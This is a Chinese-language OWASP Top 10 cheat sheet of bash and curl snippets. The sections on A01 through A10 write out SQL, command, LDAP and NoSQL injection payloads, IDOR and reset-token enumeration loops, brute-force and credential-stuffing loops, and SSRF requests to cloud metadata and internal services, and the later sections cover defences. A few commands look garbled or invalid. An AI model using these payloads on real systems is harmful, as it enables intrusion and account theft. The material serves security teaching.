---
title: OWASP Top 10
icon: fa-shield-halved
primary: "#000000"
lang: bash
locale: zhs
---

## fa-lock A01 权限控制失效

```bash
# 强制浏览未授权端点
curl https://api.example.com/admin/users
curl https://api.example.com/api/v1/users/1234/orders

# 缺少功能级访问控制
curl -X DELETE https://api.example.com/api/users/42

# 不安全的直接对象引用 (IDOR)
for i in $(seq 1 100); do
  curl -s -o "doc_$i.pdf" "https://api.example.com/files/$i"
done

# 元数据访问 (AWS S3 存储桶配置错误)
aws s3 ls s3://example-bucket --no-sign-request
```

## fa-key A02 加密失败

```bash
# 检查弱 TLS 版本
nmap --script ssl-enum-ciphers -p 443 example.com
openssl s_client -connect example.com:443 -tls1

# 验证证书详情
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -dates -issuer

# 生成强密钥
openssl rand -hex 32
openssl rand -base64 48

# 使用 bcrypt 哈希密码
python3 -c "import bcrypt; print(bcrypt.hashpw(b'secret', bcrypt.gensalt(12)).decode())"

# 检查明文传输
curl -v http://example.com/login 2>&1 | grep "POST /login"
```

## fa-syringe A03 注入

```bash
# SQL 注入测试载荷
curl "https://api.example.com/user?id=1 OR 1=1"
curl "https://api.example.com/user?id=1; DROP TABLE users--"
curl "https://api.example.com/search?q=' UNION SELECT * FROM credentials--"

# 命令注入 (未过滤输入)
curl "https://api.example.com/ping?host=8.8.8.8;cat /etc/passwd"
curl "https://api.example.com/run?cmd=test$(whoami)"

# LDAP 注入
curl "https://api.example.com/login?user=*)(|(cn=*))&pass=x"

# NoSQL 注入
curl -X POST https://api.example.com/login \
  -H "Content-Type: application/json" \
  -d '{"user": {"$gt": ""}, "pass": {"$gt": ""}}'
```

## fa-drafting-compass A04 不安全设计

```bash
# 缺少速率限制 - 暴力破解测试
for i in $(seq 1 1000); do
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://api.example.com/login \
    -d "user=admin&pass=password$i"
done

# 缺少业务逻辑限制
curl -X POST https://api.example.com/transfer \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": -100, "to": "attacker"}'

# 枚举重置令牌
for i in $(seq 100000 999999); do
  curl -s "https://api.example.com/reset?token=$i" | grep "success"
done
```

## fa-gear A05 安全配置错误

```bash
# 检查默认凭据
curl -u admin:admin https://example.com/manager/html
curl -u root:root https://example.com/phpmyadmin

# 暴露的调试端点
curl https://example.com/debug/vars
curl https://example.com/actuator/env
curl https://example.com/env
curl https://example.com/.env

# 详细错误信息
curl https://example.com/api/user/abc

# 目录列表已启用
curl https://example.com/uploads/
curl https://example.com/.git/HEAD

# 缺少安全头
curl -sI https://example.com | grep -i "x-frame\|strict-transport\|content-security"
```

## fa-puzzle-piece A06 易受攻击和过时的组件

```bash
# 检查已知 CVE 的已安装包版本
npm audit
pip audit
cargo audit
trivy fs .

# 扫描 Docker 镜像漏洞
trivy image nginx:1.14
docker scout cves nginx:1.14

# 检查过时依赖
npm outdated
pip list --outdated
go list -m -u all

# SBOM 生成
syft nginx:latest -o spdx-json > sbom.json
grader sbom sbom.json
```

## fa-user-shield A07 身份识别与认证失败

```bash
# 测试弱密码策略
curl -X POST https://api.example.com/register \
  -d "user=test&pass=123456"

# 使用泄露密码撞库
while read pass; do
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://api.example.com/login \
    -d "user=victim@email.com&pass=$pass"
done < breached-passwords.txt

# 检查会话管理
curl -v https://api.example.com/login 2>&1 | grep -i "set-cookie"
curl -I https://api.example.com/dashboard \
  -H "Cookie: session=old_or_guessable_token"
```

## fa-link-slash A08 软件与数据完整性失败

```bash
# 使用校验和验证文件完整性
sha256sum package.tar.gz
gpg --verify package.tar.gz.sig package.tar.gz

# 检查 CI/CD 管道安全
gh api repos/:owner/:repo/actions/workflows --jq '.workflows[] | .path'

# 验证 npm 包签名
npm audit signatures
cosign verify-blob --key cosign.pub artifact.tar.gz

# 检测篡改的依赖
pip hash --algorithm sha256 package.whl
npm view lodash integrity
```

## fa-eye A09 安全日志与监控失败

```bash
# 集中式日志设置 (Filebeat 示例)
cat > /etc/filebeat/filebeat.yml << 'EOF'
filebeat.inputs:
- type: log
  paths: [/var/log/nginx/access.log]
  fields: {service: nginx}
output.elasticsearch:
  hosts: ["elasticsearch:9200"]
EOF

# 告警规则 (ElastAlert)
cat > rule.yaml << 'EOF'
name: brute_force
type: frequency
index: nginx-*
num_events: 50
timeframe:
  minutes: 5
filter:
- term:
    response: "401"
alert:
- slack
EOF

# 检查日志注入
curl "https://example.com/search?q=%0aERROR%20User%20admin%20logged%20in"
```

## fa-server A10 服务端请求伪造

```bash
# 通过 URL 参数的基本 SSRF
curl "https://api.example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://api.example.com/proxy?url=http://localhost:8080/admin"
curl "https://api.example.com/fetch?url=http://127.0.0.1:6379/"

# DNS 重绑定 SSRF
curl "https://api.example.com/fetch?url=http://a.c.bndr.us/internal"

# file 协议 SSRF
curl "https://api.example.com/fetch?url=file:///etc/passwd"

# gopher 协议 SSRF
curl "https://api.example.com/fetch?url=gopher://internal-host:6379/_PING"
```

## fa-database SQL 注入防护

```bash
# Python - 参数化查询 (sqlite3)
python3 -c "
import sqlite3
conn = sqlite3.connect('db.sqlite')
conn.execute('SELECT * FROM users WHERE id = ?', (user_id,))
"

# Go - 预处理语句
cat << 'EOF'
db.Query("SELECT * FROM users WHERE id = $1", id)
db.QueryRow("SELECT name FROM users WHERE email = $1 AND pass = $2", email, hash)
EOF

# Node.js - 参数化
cat << 'EOF'
db.query("SELECT * FROM users WHERE id = ?", [req.params.id])
EOF

# ORM 使用 (避免原始查询)
cat << 'EOF'
User.query().where('id', req.params.id).first()
EOF
```

## fa-code XSS 防护

```bash
# Python - HTML 转义
python3 -c "
import html
safe = html.escape(user_input)
print(safe)
"

# Node.js - DOMPurify 清理
cat << 'EOF'
const DOMPurify = require('dompurify');
const clean = DOMPurify.sanitize(userInput);
EOF

# Go - html/template 自动转义
cat << 'EOF'
import "html/template"
tmpl.Execute(w, data)  # 自动转义 HTML
EOF

# 内容安全策略头
curl -X POST https://api.example.com/config \
  -H 'Content-Security-Policy: default-src '\''self'\''; script-src '\''self'\'''
```

## fa-shield CSRF 防护

```bash
# 同步令牌模式
curl -X POST https://api.example.com/transfer \
  -H "X-CSRF-Token: $(curl -s -c cookies.txt https://example.com/form | grep csrf | awk '{print $NF}')" \
  -b cookies.txt \
  -d "amount=100&to=user"

# 双重提交 Cookie 模式
curl -X POST https://api.example.com/api/action \
  -H "X-CSRF-Token: $RANDOM_TOKEN" \
  -H "Cookie: csrf=$RANDOM_TOKEN"

# SameSite Cookie 属性
cat << 'EOF'
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly
EOF

# Origin 头验证
curl -X POST https://api.example.com/action \
  -H "Origin: https://example.com" \
  -H "Referer: https://example.com/form"
```

## fa-heading 安全头

```bash
# 应用所有推荐的安全头
curl -X PUT https://api.example.com/headers -d '
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src '\''self'\''; script-src '\''self'\''; style-src '\''self'\''
X-XSS-Protection: 0
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
'

# Nginx 安全头
cat << 'EOF'
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Content-Security-Policy "default-src 'self'" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
EOF

# 快速安全头检查
curl -sI https://example.com | security-headers
```
